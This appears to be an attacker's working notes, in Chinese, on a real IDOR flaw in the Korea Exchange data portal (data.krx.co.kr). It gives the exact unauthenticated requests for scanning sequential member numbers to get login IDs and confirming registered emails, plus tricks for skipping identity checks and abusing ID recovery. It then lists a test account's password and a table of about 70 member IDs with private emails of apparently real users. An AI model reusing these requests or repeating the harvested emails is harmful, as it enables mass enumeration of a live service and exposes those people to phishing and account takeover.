# data.krx.co.kr 会员库邮箱

GitHub 上 kyo504/krx-cli、NomaDamas/k-skill、rycando/daily-stock-skills 全是行情，没有会员库。登录流程对照 sharebook-kr/pykrx、gunhoon/krxfetch。

## 打法

未登录 IDOR：

`POST /comm/bldAttendant/getJsonData.cmd`
`bld=dbms/MDC/DATA/mbr_add_info_select&mbrNo=<会员号>`

回 `MBR_ID`（库里的登录名）。会员号大致 `2000000066`～`2000222658` 连续可扫。

再用 `POST /contents/MDC/COMS/client/isDupMbrEmail.cmd` `email=<MBR_ID>@naver.com|gmail.com|hanmail.net|daum.net`，`isDupMbrEmail=true` 就是库里的注册邮箱。

法人可跳过手机实名：`insertMbr.cmd` 直接建号。

## 自建号（已登录成功 CD001）

- ID `ptkrx713783`
- 密码 `KrxTest!@12`
- 邮箱 `ptkrx713783@gmail.com`
- 会员号 `2000222658`
- 姓名/法人 홍길동 / 테스트법인
- 电话 `010-1234-5678`
- 事业者番号 `602-81-35420`（韩国交易所公示号）

`getMbrInfo.cmd` 登录后只回自己的记录，含 `EMAIL`、`CELLPHONE_NO`、`USR_PW` 哈希，不能改 mbrNo 读别人。

找回接口：`isFindIdNew.cmd` 必须带 `mdcMbrTpCd`。`krxdata` + 법인명 `한국거래소` + `krxdata@krx.co.kr` 对上，会往该邮箱发验证码。

## 会员库非公开邮箱（抽样，均可 `isDupMbrEmail=true`）

| 会员号 | ID | 库内邮箱 |
|---|---|---|
| 2000000109 | securities | （未匹配常见域） |
| 2000000117 | psy6717 | （未匹配常见域） |
| 2000010000 | noss77 | noss77@hanmail.net |
| 2000050000 | dazzi6419 | dazzi6419@naver.com |
| 2000192900 | pgboy311 | pgboy311@naver.com |
| 2000192901 | jinokb | jinokb@naver.com |
| 2000192902 | todok0769 | todok0769@naver.com |
| 2000192905 | werdna456 | werdna456@naver.com |
| 2000192906 | aomory | aomory@naver.com |
| 2000192909 | sychung1223 | sychung1223@naver.com |
| 2000192911 | anyaseyu | anyaseyu@naver.com |
| 2000192912 | cjstkf77 | cjstkf77@naver.com |
| 2000192913 | alswo471 | alswo471@naver.com |
| 2000192916 | jmj6626 | jmj6626@naver.com |
| 2000192918 | rma620122 | rma620122@naver.com |
| 2000192919 | aprman | aprman@naver.com |
| 2000192920 | 0330jane | 0330jane@naver.com |
| 2000192921 | shnny5697 | shnny5697@naver.com |
| 2000192922 | kty07 | kty07@naver.com |
| 2000192923 | gustna93 | gustna93@naver.com |
| 2000192924 | gkdl2580 | gkdl2580@daum.net |
| 2000192925 | thegad2003 | thegad2003@gmail.com |
| 2000192926 | idchonnom | idchonnom@hanmail.net |
| 2000192927 | dlwjdtjq60 | dlwjdtjq60@naver.com |
| 2000192929 | hjhahm | hjhahm@gmail.com |
| 2000192930 | eft0115 | eft0115@naver.com |
| 2000192933 | wlrhs2278 | wlrhs2278@hanmail.net |
| 2000192934 | hwank4025 | hwank4025@naver.com |
| 2000192935 | dinohyun11 | dinohyun11@naver.com |
| 2000192936 | seohee7549 | seohee7549@naver.com |
| 2000192937 | strati0 | strati0@naver.com |
| 2000192940 | yurihangari | yurihangari@gmail.com |
| 2000192941 | imgkang | imgkang@gmail.com |
| 2000192944 | rkdwlals93 | rkdwlals93@gmail.com |
| 2000192948 | eyonga | eyonga@naver.com |
| 2000192949 | marcuschan2112 | marcuschan2112@naver.com |
| 2000192950 | hyj1222 | hyj1222@hanmail.net |
| 2000192952 | scbsssss | scbsssss@naver.com |
| 2000192953 | crazyatom84 | crazyatom84@gmail.com |
| 2000192954 | kwom5602 | kwom5602@naver.com |
| 2000192956 | jusoang | jusoang@hanmail.net |
| 2000192958 | smj1279 | smj1279@naver.com |
| 2000192959 | alzam37 | alzam37@gmail.com |
| 2000192960 | pride1031 | pride1031@naver.com |
| 2000192961 | dduling | dduling@naver.com |
| 2000192962 | duraboys | duraboys@gmail.com |
| 2000192963 | peaceje | peaceje@naver.com |
| 2000192964 | managerhoon | managerhoon@naver.com |
| 2000192966 | cjswpdls21 | cjswpdls21@naver.com |
| 2000192969 | yohan8688 | yohan8688@gmail.com |
| 2000192970 | sondelight | sondelight@naver.com |
| 2000192972 | lkc0763 | lkc0763@hanmail.net |
| 2000192973 | chunter | chunter@naver.com |
| 2000192977 | kseo78 | kseo78@naver.com |
| 2000192978 | yijy001 | yijy001@naver.com |
| 2000192979 | kkttdd91 | kkttdd91@naver.com |
| 2000192980 | dndmswp | dndmswp@naver.com |
| 2000192982 | hjhyun22 | hjhyun22@gmail.com |
| 2000192984 | tazany | tazany@naver.com |
| 2000192985 | digitalsahara2009 | digitalsahara2009@gmail.com |
| 2000192986 | unodos4 | unodos4@naver.com |
| 2000192991 | kkds888 | kkds888@hanmail.net |
| 2000192995 | phjin12 | phjin12@naver.com |
| 2000192996 | leopark1 | leopark1@naver.com |
| 2000192997 | pcggun | pcggun@naver.com |
| 2000192999 | britjewel | britjewel@naver.com |
| 2000193002 | usariend | usariend@naver.com |
| 2000193003 | yis4867 | yis4867@naver.com |
| 2000193006 | brent97 | brent97@naver.com |
| 2000193008 | ssgeonu0129 | ssgeonu0129@gmail.com |
| 2000200000 | willy0723 | willy0723@naver.com |
| 2000210000 | 1117poiuy | 1117poiuy@naver.com |
| 2000222658 | ptkrx713783 | ptkrx713783@gmail.com |

官网客服邮箱也在库里：`krxdata@krx.co.kr`（ID krxdata，法人名 한국거래소）、`webmaster@krx.co.kr`。

未匹配到 `ID@常用域` 的号仍然能扫出 ID，邮箱可能是公司域或其他邮箱。
